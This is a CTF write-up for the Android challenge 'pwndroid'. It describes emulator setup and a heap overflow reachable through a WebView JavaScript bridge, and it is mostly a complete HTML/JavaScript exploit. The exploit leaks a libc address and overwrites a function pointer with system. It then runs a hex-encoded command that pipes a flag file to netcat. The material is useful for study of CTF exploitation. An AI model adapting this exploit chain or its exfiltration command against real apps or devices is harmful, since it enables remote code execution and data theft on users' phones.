# pwndroid
环境搭建:
```
sdkmanager --install "system-images;android-24;default;x86"   #保证环境和远程一致(Most for same libc.so)
echo "no" | avdmanager --verbose create avd --force --name "kirin_magic" --package "system-images;android-24;default;x86" --tag "default" --abi "x86"

cat ~/.android/avd/kirin_magic.avd/config.ini
PlayStore.enabled=false
abi.type=x86
avd.ini.encoding=UTF-8
hw.cpu.arch=x86
image.sysdir.1=system-images/android-24/default/x86/
tag.display=
tag.id=default

skin.name=1080x1920       
hw.lcd.density=480
hw.keyboard=yes
```
Debug:
```
~/Library/Android/sdk/platform-tools:
adb push android_x86_server  /data/local/tmp
adb forward tcp:23946 tcp:23946   //for debug
adb reverse  tcp:1234 tcp:1234 //for WebView
```
输入ip，远程会执行
```
adb shell am force-stop ctf.bytedance.pwndroid
adb shell su root ps | grep "ctf\.bytedance\.pwndroid" | awk '{print $2}' | xargs -t adb shell su root kill -9
adb shell am start -a android.intent.action.VIEW -d pwndroid://ip
```
即：新开启pwndroid app来加载ip位置网页

看到APK内部native层定义了常见的add edit show delete操作

明显可以通过show直接leak，且在edit时存在堆溢出

堆结构:
```
char* data
func* print_handle
```
show时会调用print_handle(data)

可以在leak libc后直接通过溢出修改堆中的print_handle函数指针为system来RCE

注意堆风水比较复杂，这里我进行了小的堆喷操作，并利用ELF文件头来确定哪一个index1会溢出到哪一个index2

在NativeMethods中进行了封装，并在JSBridge中调用

PwnMe中看到:
```
this.mWebView.addJavascriptInterface(new JSBridge(this.mWebView), "_jsbridge");
```
加入了_jsbridge对象

直接在html中利用_jsbridge对象间接调用Native层即可

注意callback时因为异步问题，无法在callback函数内部及时更新全局变量（尤其show时，很不方便leak），可以利用延时，通过setTimeout解决

### EXP:
```
//时间紧，写得有点急
<!DOCTYPE html>
<html>
<body>
Kirin 
<script>
var kirin
var kirin2
var index
var index2
var addr
var libc_addr
function getresult(obj) {
   var a=obj['msg']
   if(a[24]=='F' && a[25]=='0' && a[27]=='B'){
    kirin=a
   }
}

function get0(obj){
    var tmp=obj['msg']
    if(tmp[0]=='7' && tmp[1] == 'F' ){
        index2=0
    }
}
function get1(obj){
    var tmp=obj['msg']
    if(tmp[0]=='7' && tmp[1] == 'F' ){
        index2=1
    }
}
function get2(obj){
    var tmp=obj['msg']
    if(tmp[0]=='7' && tmp[1] == 'F' ){
        index2=2
    }
}
function get3(obj){
    var tmp=obj['msg']
    if(tmp[0]=='7' && tmp[1] == 'F' ){
        index2=3
    }
}
function get4(obj){
    var tmp=obj['msg']
    if(tmp[0]=='7' && tmp[1] == 'F' ){
        index2=4
    }
}
function get5(obj){
    var tmp=obj['msg']
    if(tmp[0]=='7' && tmp[1] == 'F' ){
        index2=5
    }
}
function get6(obj){
    var tmp=obj['msg']
    if(tmp[0]=='7' && tmp[1] == 'F' ){
        index2=6
    }
}
function get7(obj){
    var tmp=obj['msg']
    if(tmp[0]=='7' && tmp[1] == 'F' ){
        index2=7
    }
}
function get8(obj){
    var tmp=obj['msg']
    if(tmp[0]=='7' && tmp[1] == 'F' ){
        index2=8
    }
}
function get9(obj){
    var tmp=obj['msg']
    if(tmp[0]=='7' && tmp[1] == 'F' ){
        index2=9
    }
}
function get10(obj){
    var tmp=obj['msg']
    if(tmp[0]=='7' && tmp[1] == 'F' ){
        index2=10
    }
}
function get11(obj){
    var tmp=obj['msg']
    if(tmp[0]=='7' && tmp[1] == 'F' ){
        index2=11
    }
}
function get12(obj){
    var tmp=obj['msg']
    if(tmp[0]=='7' && tmp[1] == 'F' ){
        index2=12
    }
}
function get13(obj){
    var tmp=obj['msg']
    if(tmp[0]=='7' && tmp[1] == 'F' ){
        index2=13
    }
}
function get_final(obj){
    kirin2=obj['msg']
}
//document.body.append(typeof _jsbridge)
function magic(){
 //alert(typeof _jsbridge)
 _jsbridge.call("add", '{"data":{"idx":0,"size":8,"content":"111111111111111111111"}, "cbName": ""}');
 _jsbridge.call("add", '{"data":{"idx":1,"size":8,"content":"2222222222222222222222"}, "cbName": ""}');
 _jsbridge.call("add", '{"data":{"idx":2,"size":8,"content":"33333333333333333333333"}, "cbName": ""}');
 _jsbridge.call("add", '{"data":{"idx":3,"size":8,"content":"44444444444444444444444"}, "cbName": ""}');
 _jsbridge.call("add", '{"data":{"idx":4,"size":8,"content":"55555555555555555555555"}, "cbName": ""}');
 _jsbridge.call("add", '{"data":{"idx":5,"size":8,"content":"666666666666666666666666"}, "cbName": ""}');
 _jsbridge.call("add", '{"data":{"idx":6,"size":8,"content":"777777777777777777777777"}, "cbName": ""}');
 _jsbridge.call("add", '{"data":{"idx":7,"size":8,"content":"888888888888888888888888"}, "cbName": ""}');
 _jsbridge.call("add", '{"data":{"idx":8,"size":8,"content":"99999999999999999999999"}, "cbName": ""}');
 _jsbridge.call("add", '{"data":{"idx":9,"size":8,"content":"aaaaaaaaaaaaaaaaaaaaaaaa"}, "cbName": ""}');
 _jsbridge.call("add", '{"data":{"idx":10,"size":8,"content":"bbbbbbbbbbbbbbbbbbbbbbbbb"}, "cbName": ""}');
 _jsbridge.call("add", '{"data":{"idx":11,"size":8,"content":"ccccccccccccccccccccccccc"}, "cbName": ""}');
 _jsbridge.call("add", '{"data":{"idx":12,"size":8,"content":"ddddddddddddddddddddddddd"}, "cbName": ""}');
 _jsbridge.call("add", '{"data":{"idx":13,"size":8,"content":"eeeeeeeeeeeeeeeeeeeeeeeee"}, "cbName": ""}');
 _jsbridge.call("add", '{"data":{"idx":14,"size":128,"content":"bbbbbbbbbbbbbbbbbbbbbbbbb"}, "cbName": ""}');
 // _jsbridge.call("edit", '{"data":{"idx":0,"size":44,"content":"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"}, "cbName": ""}');
 //_jsbridge.call("show", '{"data":{"idx":0}, "cbName": getresult}');
 for (var i = 0; i < 14; i++) {
    _jsbridge.call("show", '{"data":{"idx":'+i+'}, "cbName": getresult}');
 }
setTimeout(function() { 
    addr=parseInt(kirin[24],16)*0x10+parseInt(kirin[25],16)+parseInt(kirin[26],16)*0x1000+parseInt(kirin[27],16)*0x100+parseInt(kirin[28],16)*0x100000+parseInt(kirin[29],16)*0x10000+parseInt(kirin[30],16)*0x10000000+parseInt(kirin[31],16)*0x1000000
    addr=addr-0xbf0

    index=parseInt(kirin[0],16)-1
    tmp = addr.toString(16)  
    //alert(tmp) 
    content='bbbbbbbbbbbbbbbb'+tmp[7-1]+tmp[7-0]+tmp[7-3]+tmp[7-2]+tmp[7-5]+tmp[7-4]+tmp[7-7]+tmp[7-6]
     _jsbridge.call("edit", '{"data":{"idx":'+index+',"size":12,"content":"'+content+'"}, "cbName": ""}');
     for (var i = 0; i < 14; i++) {
        _jsbridge.call("show", '{"data":{"idx":'+i+'}, "cbName": get'+i+'}');
     }
     setTimeout(function() { 
         //alert(index2)
         tmp_addr=addr+0x2FF8
         tmp = tmp_addr.toString(16)   
         content='bbbbbbbbbbbbbbbb'+tmp[7-1]+tmp[7-0]+tmp[7-3]+tmp[7-2]+tmp[7-5]+tmp[7-4]+tmp[7-7]+tmp[7-6]
         _jsbridge.call("edit", '{"data":{"idx":'+index+',"size":12,"content":"'+content+'"}, "cbName": ""}');
         _jsbridge.call("show", '{"data":{"idx":'+index2+'}, "cbName": get_final}');
        setTimeout(function() { 
            //alert(kirin2) 
            libc_addr=parseInt(kirin2[24-24],16)*0x10+parseInt(kirin2[25-24],16)+parseInt(kirin2[26-24],16)*0x1000+parseInt(kirin2[27-24],16)*0x100+parseInt(kirin2[28-24],16)*0x100000+parseInt(kirin2[29-24],16)*0x10000+parseInt(kirin2[30-24],16)*0x10000000+parseInt(kirin2[31-24],16)*0x1000000-0x0014550
            //alert(libc_addr.toString(16))
            content="bbbbbbbbbbbbbbbb"+kirin[8+8]+kirin[8+9]+kirin[8+10]+kirin[8+11]+kirin[8+12]+kirin[8+13]+kirin[8+14]+kirin[8+15]
            tmp_addr=libc_addr+0x0072b60
            tmp = tmp_addr.toString(16)  
            //alert(index)
            //>>> 'sh -c "cat /data/local/tmp/flag | nc 127.0.0.1 6666"\x00'.encode("hex")
            //'7368202d632022636174202f646174612f6c6f63616c2f746d702f666c6167207c206e63203132372e302e302e3120363636362200'
            //>>> len(_)/2
            //53
            content=content+tmp[7-1]+tmp[7-0]+tmp[7-3]+tmp[7-2]+tmp[7-5]+tmp[7-4]+tmp[7-7]+tmp[7-6]
            cmd="7368202d632022636174202f646174612f6c6f63616c2f746d702f666c6167207c206e63203132372e302e302e3120363636362200"
            _jsbridge.call("edit", '{"data":{"idx":'+index+',"size":16,"content":"'+content+'"}, "cbName": ""}');
            _jsbridge.call("edit", '{"data":{"idx":'+index2+',"size":53,"content":"'+cmd+'"}, "cbName": ""}');
            _jsbridge.call("show", '{"data":{"idx":'+index2+'}, "cbName": "get13"}');
        }, 1000)
     }, 1000)
}, 1000)
    

}
//alert(a)
magic()

</script>
</body>
</html>
```